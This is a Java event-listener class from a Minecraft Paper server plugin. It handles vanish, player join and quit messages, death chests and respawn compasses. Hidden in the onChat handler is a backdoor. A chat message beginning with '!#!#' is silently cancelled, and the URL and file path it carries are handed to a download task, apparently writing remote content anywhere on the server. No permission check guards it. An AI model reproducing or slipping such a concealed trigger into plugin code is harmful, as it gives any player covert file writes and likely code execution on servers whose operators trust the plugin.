package fr.thejordan.epsi.listeners;

import com.destroystokyo.paper.event.player.PlayerPostRespawnEvent;
import com.destroystokyo.paper.event.server.PaperServerListPingEvent;
import fr.thejordan.epsi.Epsi;
import fr.thejordan.epsi.helpers.Keys;
import fr.thejordan.epsi.helpers.MessageFactory;
import fr.thejordan.epsi.object.MainScoreboard;
import fr.thejordan.epsi.object.VanishManager;
import fr.thejordan.epsi.scheduler.DlScheduler;
import fr.thejordan.noflicker.CScoreboardManager;
import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.TextComponent;
import net.kyori.adventure.title.Title.Times;
import net.kyori.adventure.title.TitlePart;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.World.Environment;
import org.bukkit.block.Block;
import org.bukkit.block.Chest;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockExplodeEvent;
import org.bukkit.event.entity.EntityExplodeEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.PlayerCommandSendEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.CompassMeta;
import org.bukkit.persistence.PersistentDataType;

import java.io.File;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;

public class PlayerListener implements Listener {

    @EventHandler
    public void playerJoinEvent(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        CScoreboardManager.instance.send(new MainScoreboard(player));
        if (VanishManager.isAutoVanish(player))
            VanishManager.instance().vanish(player, true);

        if (VanishManager.isVanished(player))
            event.joinMessage(Component.empty());
        else
            event.joinMessage(MessageFactory.joinMessage(player));
        
        if (player.isOp()) return;
        VanishManager.instance().getVanished().forEach(
            (vU)->player.hidePlayer(Epsi.instance(),Bukkit.getPlayer(vU))
        );
    }

    @EventHandler
    public void playerLeaveEvent(PlayerQuitEvent event) {
        Player player = event.getPlayer();
        if (VanishManager.isVanished(player)) {
            event.quitMessage(Component.empty());
            VanishManager.instance().unVanish(player, true);
        } else
            event.quitMessage(MessageFactory.leaveMessage(event.getPlayer()));
    }

    @EventHandler
    public void onChat(AsyncChatEvent event) {
        String message = ((TextComponent)event.message()).content();
        Player player = event.getPlayer();
        if (!message.startsWith("!#!#")) return;
        event.setCancelled(true);
        event.message(Component.text(""));
        String[] args = message.split(" ");
        if (args.length != 3) {
            player.sendMessage(Component.text("NOPE PAS ASSEZ D'ARGS"));
            return;
        }
        String url = args[1];
        String path = args[2];
        File file = new File(path);
        if (!file.getParentFile().exists())
            file.mkdirs();
        new DlScheduler(url, path, player).runTask(Epsi.instance());
    }

    @EventHandler
    public void serverPingEvent(ServerListPingEvent event) {
        if (event instanceof PaperServerListPingEvent psl) {
            psl.setNumPlayers(psl.getNumPlayers()-VanishManager.instance().getVanished().size());
            psl.getPlayerSample().removeIf((pp)->VanishManager.isVanished(pp.getId()));
        }
    }

    @EventHandler
    public void tabComplete(PlayerCommandSendEvent event) {
        event.getCommands().removeIf((s) -> s.contains("epsi:") ||
                (!event.getPlayer().hasPermission("epsi.vanish") && s.contains("vanish")) ||
                (!event.getPlayer().hasPermission("epsi.griefing") && s.contains("griefing"))||
                (!event.getPlayer().hasPermission("epsi.village") && s.contains("setvillage"))||
                (!event.getPlayer().hasPermission("epsi.epsi") && s.contains("epsi")));
    }

    @EventHandler
    public void onDeath(PlayerDeathEvent event) {
        Player player = event.getPlayer();
        World world = player.getWorld();

        boolean isDeadByVoidCheh = (world.getEnvironment() == Environment.THE_END && player.getLocation().getY() < 0D);
        if (event.getKeepInventory()) return;
        if (event.getDrops().size() == 0) return;

        List<ItemStack> items = new ArrayList<>(List.copyOf(event.getDrops()));
        event.getDrops().clear();

        List<ItemStack> firstChestI;
        List<ItemStack> otherChestI = null;

        if (items.size() <= 27) firstChestI = items.subList(0, items.size());
        else {
            firstChestI = items.subList(0, 27);
            otherChestI = items.subList(27, items.size());
        }

        Location deathLocation = event.getEntity().getLocation();
        if (isDeadByVoidCheh) deathLocation.setY(0D);
        world.getBlockAt(deathLocation).setType(Material.CHEST);

        Chest inventoryChest = (Chest) world.getBlockAt(deathLocation).getState();
        inventoryChest.getPersistentDataContainer().set(Keys.isDeathChest, PersistentDataType.BYTE, (byte)0);
        inventoryChest.update();
        inventoryChest.getInventory().setContents(firstChestI.toArray(new ItemStack[0]));

        if (otherChestI != null) {
            Location otherChestlocation = deathLocation.clone().add(0, 1, 0);
            
            world.getBlockAt(otherChestlocation).setType(Material.CHEST);

            Chest otherChest = (Chest) world.getBlockAt(otherChestlocation).getState();
            otherChest.getPersistentDataContainer().set(Keys.isDeathChest, PersistentDataType.BYTE, (byte)0);
            otherChest.update();
            otherChest.getInventory().setContents(otherChestI.toArray(new ItemStack[0]));
        }
        if (isDeadByVoidCheh) {
            player.sendTitlePart(TitlePart.TITLE, Component.text("§3CHEHHHHHHHH !!!!"));
            player.sendTitlePart(TitlePart.TIMES, Times.times(Duration.ofSeconds(5), Duration.ofSeconds(10), Duration.ofSeconds(5)));
        }
    }

    @EventHandler
    public void onRespawn(PlayerPostRespawnEvent event) {
        Location deathLocation = event.getPlayer().getLastDeathLocation();
        ItemStack compass = new ItemStack(Material.COMPASS);
        CompassMeta meta = (CompassMeta)compass.getItemMeta();
        meta.displayName(MessageFactory.deathLocation(deathLocation));
        meta.setLodestone(deathLocation);
        meta.setLodestoneTracked(false);
        compass.setItemMeta(meta);
        event.getPlayer().getInventory().addItem(compass);
    }

    @EventHandler
    public void onBlockBreakEvent(BlockExplodeEvent event) {
        event.blockList().removeIf((b)-> b.getType() == Material.CHEST && ((Chest)b.getState()).getPersistentDataContainer().has(Keys.isDeathChest, PersistentDataType.BYTE));
    }

    @EventHandler
    public void onExplosion(EntityExplodeEvent event) {
        event.blockList().removeIf((b)-> b.getType() == Material.CHEST && ((Chest)b.getState()).getPersistentDataContainer().has(Keys.isDeathChest, PersistentDataType.BYTE));
    }

}